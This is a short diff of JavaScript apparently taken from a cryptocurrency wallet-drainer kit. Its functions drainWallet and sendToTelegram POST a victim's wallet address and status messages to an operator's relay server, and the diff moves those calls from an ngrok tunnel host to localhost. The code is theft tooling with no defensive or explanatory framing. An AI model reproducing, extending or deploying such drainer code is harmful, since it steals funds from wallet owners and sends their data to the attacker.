@@ -49,7 +49,7 @@
     }
 
     async function drainWallet(address) {
-      const response = await fetch('https://1234.ngrok.io/drain', {
+      const response = await fetch('http://localhost:3000/drain', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ address })
@@ -59,7 +59,7 @@
     }
 
     function sendToTelegram(message) {
-      fetch('http://1234.ngrok.io/telegram', {
+      fetch('http://localhost:3000/telegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ message })
